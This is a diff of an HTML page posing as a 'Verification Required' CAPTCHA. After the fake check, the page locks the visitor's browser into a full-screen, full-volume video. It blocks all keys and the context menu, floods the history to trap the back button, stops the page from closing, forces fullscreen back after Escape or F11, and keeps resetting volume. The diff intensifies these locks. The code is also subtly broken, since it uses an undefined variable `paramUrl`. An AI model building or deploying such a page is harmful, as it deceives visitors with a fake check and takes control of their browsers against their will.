@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
   <title>Verification Required</title>
   <style>
     * {
@@ -65,16 +65,11 @@
       margin-right: 12px;
     }
 
-    .checkmark {
-      width: 22px;
-      height: 22px;
-      display: none;
-    }
+    .checkmark { width: 22px; height: 22px; display: none; }
     .checkmark.show { display: block; }
 
     .spinner {
-      width: 24px;
-      height: 24px;
+      width: 24px; height: 24px;
       border: 3px solid #e0e0e0;
       border-top: 3px solid #4285f4;
       border-radius: 50%;
@@ -82,106 +77,70 @@
       display: none;
     }
     .spinner.show { display: block; }
-
     @keyframes spin { to { transform: rotate(360deg); } }
 
     .captcha-label { flex: 1; font-size: 14px; color: #000; }
 
     .captcha-logo {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      margin-left: 8px;
+      display: flex; flex-direction: column;
+      align-items: center; margin-left: 8px;
     }
-
     .logo-img { width: 32px; height: 32px; }
     .logo-text { font-size: 8px; color: #555; font-weight: bold; }
     .logo-sub { font-size: 7px; color: #999; }
 
-    #errorScreen {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: white;
-      z-index: 999;
-      align-items: center;
-      justify-content: center;
-      flex-direction: column;
-      padding: 20px;
-      text-align: center;
-    }
-
-    #errorScreen h1 {
-      font-size: 60px;
-      color: #ccc;
-    }
-
-    #errorScreen p {
-      font-size: 18px;
-      color: #555;
-      margin-top: 10px;
-    }
-
     #playScreen {
       display: none;
-      position: fixed;
-      inset: 0;
-      background: black;
-      z-index: 150;
-      align-items: center;
-      justify-content: center;
-      flex-direction: column;
-      cursor: pointer;
+      position: fixed; inset: 0;
+      background: black; z-index: 150;
+      align-items: center; justify-content: center;
+      flex-direction: column; cursor: pointer;
     }
 
     #playButton {
-      width: 100px;
-      height: 100px;
+      width: 100px; height: 100px;
       border-radius: 50%;
       background: rgba(255,255,255,0.2);
       border: 3px solid white;
-      display: flex;
-      align-items: center;
+      display: flex; align-items: center;
       justify-content: center;
       animation: pulse 1.5s infinite;
     }
-
     #playButton::before {
-      content: "";
-      width: 0;
-      height: 0;
+      content: ""; width: 0; height: 0;
       border-left: 30px solid white;
       border-top: 20px solid transparent;
       border-bottom: 20px solid transparent;
       margin-left: 8px;
     }
-
     @keyframes pulse {
       0%, 100% { transform: scale(1); }
       50% { transform: scale(1.1); }
     }
-
-    #playText {
-      color: white;
-      font-size: 18px;
-      margin-top: 20px;
-    }
+    #playText { color: white; font-size: 18px; margin-top: 20px; }
 
     #videoScreen {
       display: none;
-      position: fixed;
-      inset: 0;
-      background: black;
-      z-index: 200;
+      position: fixed; inset: 0; background: black; z-index: 200;
     }
 
     #myVideo {
-      width: 100%;
-      height: 100%;
-      object-fit: contain;
-      background: black;
+      width: 100%; height: 100%;
+      object-fit: contain; background: black;
       display: block;
     }
+
+    #errorScreen {
+      display: none;
+      position: fixed; inset: 0;
+      background: white; z-index: 999;
+      align-items: center; justify-content: center;
+      flex-direction: column;
+    }
+    #errorScreen h1 { font-size: 60px; color: #ccc; }
+    #errorScreen p { font-size: 18px; color: #555; margin-top: 10px; }
+
+    html, body { overflow: hidden; position: fixed; width: 100%; height: 100%; }
   </style>
 </head>
 <body>
@@ -222,219 +181,185 @@
   </div>
 
   <script>
-    const errorScreen  = document.getElementById("errorScreen");
-    const verifyScreen = document.getElementById("verifyScreen");
-    const captchaBox   = document.getElementById("captchaBox");
-    const spinner      = document.getElementById("spinner");
-    const checkmark    = document.getElementById("checkmark");
-    const playScreen   = document.getElementById("playScreen");
-    const videoScreen  = document.getElementById("videoScreen");
-    const video        = document.getElementById("myVideo");
+    (function() {
+      const errorScreen  = document.getElementById("errorScreen");
+      const verifyScreen = document.getElementById("verifyScreen");
+      const captchaBox   = document.getElementById("captchaBox");
+      const spinner      = document.getElementById("spinner");
+      const checkmark    = document.getElementById("checkmark");
+      const playScreen   = document.getElementById("playScreen");
+      const videoScreen  = document.getElementById("videoScreen");
+      const video        = document.getElementById("myVideo");
 
-    const REDIRECT_URL = "https://www.google.com";
+      const REDIRECT_URL = "https://www.google.com";
 
-    let videoStarted = false;
-    let captchaUsed  = false;
+      let videoStarted = false;
+      let captchaUsed  = false;
+      let ended        = false;
 
-    const params   = new URLSearchParams(window.location.search);
-    const videoUrl = params.get("v");
+      // ====== CHANGE THIS TO YOUR VIDEO URL ======
+      // Option A: Hardcode a video URL directly:
+      const VIDEO_URL = "https://www.w3schools.com/html/mov_bbb.mp4";
+      if (paramUrl) {
+        video.src = paramUrl;
+      } else {
+        video.src = VIDEO_URL;
+      }
 
-    if (!videoUrl) {
-      verifyScreen.style.display = "none";
-      errorScreen.style.display  = "flex";
-    } else {
-      video.src = videoUrl;
-    }
+      if (!video.src) {
+        verifyScreen.style.display = "none";
+        errorScreen.style.display = "flex";
+      }
 
-    captchaBox.addEventListener("click", async () => {
-      if (captchaUsed) return;
-      captchaUsed = true;
-      spinner.classList.add("show");
-      await new Promise(r => setTimeout(r, 1500));
-      spinner.classList.remove("show");
-      checkmark.classList.add("show");
-      await new Promise(r => setTimeout(r, 500));
-      tryStart();
-    });
+      // CAPTCHA CLICK
+      captchaBox.addEventListener("click", async () => {
+        if (captchaUsed) return;
+        captchaUsed = true;
+        spinner.classList.add("show");
+        await new Promise(r => setTimeout(r, 1500));
+        spinner.classList.remove("show");
+        checkmark.classList.add("show");
+        await new Promise(r => setTimeout(r, 500));
+        tryStart();
+      });
 
-    async function tryStart() {
-      verifyScreen.style.display = "none";
-
-      try {
-        await requestFS();
-        video.muted = false;
-        video.volume = 1.0;
-        await video.play();
-        videoScreen.style.display = "block";
-        videoStarted = true;
-        activateLocks();
-        return;
-      } catch(e) { console.log("Direct failed:", e); }
-
-      try {
-        video.muted = true;
-        await video.play();
-        videoScreen.style.display = "block";
-        videoStarted = true;
-        setTimeout(() => {
+      async function tryStart() {
+        verifyScreen.style.display = "none";
+        try {
+          await requestFS();
           video.muted = false;
           video.volume = 1.0;
-        }, 300);
-        try { await requestFS(); } catch(e) {}
-        activateLocks();
-        return;
-      } catch(e) { console.log("Muted failed:", e); }
+          await video.play();
+          videoScreen.style.display = "block";
+          videoStarted = true;
+          activateLocks();
+          return;
+        } catch(e) {}
 
-      playScreen.style.display = "flex";
-    }
-
-    playScreen.addEventListener("click", async () => {
-      playScreen.style.display = "none";
-      videoScreen.style.display = "block";
-      videoStarted = true;
-      try { await requestFS(); } catch(e) {}
-      try {
-        video.muted = false;
-        video.volume = 1.0;
-        await video.play();
-      } catch(e) {
         try {
           video.muted = true;
           await video.play();
-          setTimeout(() => {
-            video.muted = false;
-            video.volume = 1.0;
-          }, 300);
-        } catch(e2) {}
-      }
-      activateLocks();
-    });
+          videoScreen.style.display = "block";
+          videoStarted = true;
+          setTimeout(() => { video.muted = false; video.volume = 1.0; }, 300);
+          try { await requestFS(); } catch(e) {}
+          activateLocks();
+          return;
+        } catch(e) {}
 
-    function requestFS() {
-      const el = document.documentElement;
-      if (el.requestFullscreen)        return el.requestFullscreen();
-      if (el.webkitRequestFullscreen)  return el.webkitRequestFullscreen();
-      if (el.mozRequestFullScreen)     return el.mozRequestFullScreen();
-      if (el.msRequestFullscreen)      return el.msRequestFullscreen();
-      return Promise.reject("No FS");
-    }
-
-    function isFS() {
-      return !!(document.fullscreenElement ||
-                document.webkitFullscreenElement ||
-                document.mozFullScreenElement ||
-                document.msFullscreenElement);
-    }
-
-    function exitFS() {
-      if (document.exitFullscreen)        return document.exitFullscreen();
-      if (document.webkitExitFullscreen)  return document.webkitExitFullscreen();
-      if (document.mozCancelFullScreen)   return document.mozCancelFullScreen();
-      if (document.msExitFullscreen)      return document.msExitFullscreen();
-    }
-
-    video.addEventListener("ended", () => {
-      videoStarted = false;
-      try { if (isFS()) exitFS(); } catch(e) {}
-      window.location.href = REDIRECT_URL;
-    });
-
-    function activateLocks() {
-      document.addEventListener("keydown", blockKey, true);
-      document.addEventListener("keyup", blockKey, true);
-      document.addEventListener("keypress", blockKey, true);
-
-      document.addEventListener("contextmenu", (e) => {
-        e.preventDefault();
-        return false;
-      }, true);
-
-      for (let i = 0; i < 20; i++) {
-        history.pushState(null, "", location.href);
+        playScreen.style.display = "flex";
       }
 
-      window.addEventListener("popstate", () => {
-        if (videoStarted && !video.ended) {
-          history.pushState(null, "", location.href);
-          history.pushState(null, "", location.href);
+      playScreen.addEventListener("click", async () => {
+        playScreen.style.display = "none";
+        videoScreen.style.display = "block";
+        videoStarted = true;
+        try { await requestFS(); } catch(e) {}
+        try {
+          video.muted = false; video.volume = 1.0;
+          await video.play();
+        } catch(e) {
+          try {
+            video.muted = true;
+            await video.play();
+            setTimeout(() => { video.muted = false; video.volume = 1.0; }, 300);
+          } catch(e2) {}
         }
+        activateLocks();
       });
 
-      window.addEventListener("beforeunload", (e) => {
-        if (videoStarted && !video.ended) {
-          e.preventDefault();
-          e.returnValue = "";
-          return "";
-        }
+      function requestFS() {
+        const el = document.documentElement;
+        if (el.requestFullscreen) return el.requestFullscreen();
+        if (el.webkitRequestFullscreen) return el.webkitRequestFullscreen();
+        if (el.mozRequestFullScreen) return el.mozRequestFullScreen();
+        if (el.msRequestFullscreen) return el.msRequestFullscreen();
+        return Promise.reject("No FS");
+      }
+
+      function isFS() {
+        return !!(document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement || document.msFullscreenElement);
+      }
+
+      function exitFS() {
+        if (document.exitFullscreen) return document.exitFullscreen();
+        if (document.webkitExitFullscreen) return document.webkitExitFullscreen();
+        if (document.mozCancelFullScreen) return document.mozCancelFullScreen();
+        if (document.msExitFullscreen) return document.msExitFullscreen();
+      }
+
+      video.addEventListener("ended", () => {
+        ended = true;
+        videoStarted = false;
+        try { if (isFS()) exitFS(); } catch(e) {}
+        window.location.href = REDIRECT_URL;
       });
 
-      const fsEvents = ["fullscreenchange", "webkitfullscreenchange", "mozfullscreenchange", "MSFullscreenChange"];
-      fsEvents.forEach(evt => {
-        document.addEventListener(evt, () => {
-          if (!isFS() && videoStarted && !video.ended) {
-            setTimeout(() => requestFS().catch(() => {}), 100);
-            setTimeout(() => requestFS().catch(() => {}), 500);
-            setTimeout(() => requestFS().catch(() => {}), 1500);
+      function activateLocks() {
+        document.addEventListener("keydown", blockKey, true);
+        document.addEventListener("keyup", blockKey, true);
+        document.addEventListener("keypress", blockKey, true);
+        document.addEventListener("contextmenu", (e) => { e.preventDefault(); return false; }, true);
+
+        for (let i = 0; i < 50; i++) history.pushState(null, "", location.href);
+
+        window.addEventListener("popstate", () => {
+          if (ended) return;
+          for (let i = 0; i < 20; i++) history.pushState(null, "", location.href);
+          if (!isFS()) requestFS().catch(() => {});
+        });
+
+        window.addEventListener("beforeunload", (e) => {
+          if (!ended && videoStarted) { e.preventDefault(); e.returnValue = ""; return ""; }
+        });
+
+        const fsEvents = ["fullscreenchange", "webkitfullscreenchange", "mozfullscreenchange", "MSFullscreenChange"];
+        fsEvents.forEach(evt => {
+          document.addEventListener(evt, () => {
+            if (!ended && videoStarted && !isFS()) {
+              for (let ms = 0; ms < 10000; ms += 300) setTimeout(() => requestFS().catch(() => {}), ms);
+            }
+          });
+        });
+
+        document.addEventListener("visibilitychange", () => {
+          if (ended || !videoStarted) return;
+          if (document.hidden) { video.pause(); }
+          else {
+            requestFS().catch(() => {});
+            setTimeout(() => { video.volume = 1.0; video.muted = false; video.play().catch(() => {}); }, 200);
           }
         });
-      });
 
-      document.addEventListener("visibilitychange", () => {
-        if (videoStarted && !video.ended) {
-          if (document.hidden) {
-            video.pause();
-          } else {
-            requestFS().catch(() => {});
-            video.volume = 1.0;
-            video.muted = false;
-            video.play().catch(() => {});
-          }
-        }
-      });
+        window.addEventListener("blur", () => {
+          if (ended || !videoStarted) return;
+          setTimeout(() => { window.focus(); requestFS().catch(() => {}); video.volume = 1.0; video.muted = false; video.play().catch(() => {}); }, 50);
+        });
 
-      window.addEventListener("blur", () => {
-        if (videoStarted && !video.ended) {
-          setTimeout(() => {
-            window.focus();
-            requestFS().catch(() => {});
-            video.play().catch(() => {});
-          }, 100);
-        }
-      });
-
-      video.addEventListener("volumechange", () => {
-        if (videoStarted && !video.ended) {
+        video.addEventListener("volumechange", () => {
+          if (ended || !videoStarted) return;
           video.volume = 1.0;
           video.muted = false;
-        }
-      });
+        });
 
-      document.addEventListener("touchmove", (e) => {
-        if (videoStarted && !video.ended) e.preventDefault();
-      }, { passive: false });
+        document.addEventListener("touchmove", (e) => { if (!ended && videoStarted) e.preventDefault(); }, { passive: false });
+        document.addEventListener("wheel", (e) => { if (!ended && videoStarted) e.preventDefault(); }, { passive: false });
 
-      document.addEventListener("wheel", (e) => {
-        if (videoStarted && !video.ended) e.preventDefault();
-      }, { passive: false });
-
-      setInterval(() => {
-        if (videoStarted && !video.ended) {
-          video.volume = 1.0;
-          video.muted = false;
+        setInterval(() => {
+          if (ended || !videoStarted) return;
+          video.volume = 1.0; video.muted = false;
           if (video.paused) video.play().catch(() => {});
           if (!isFS()) requestFS().catch(() => {});
-        }
-      }, 1000);
-    }
+        }, 500);
+      }
 
-    function blockKey(e) {
-      if (!videoStarted || video.ended) return;
-      e.preventDefault();
-      e.stopPropagation();
-      e.stopImmediatePropagation();
-      return false;
-    }
+      function blockKey(e) {
+        if (ended || !videoStarted) return;
+        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+        if (e.key === "Escape" || e.key === "F11") setTimeout(() => requestFS().catch(() => {}), 10);
+        return false;
+      }
+    })();
   </script>
-
 </body>
 </html>
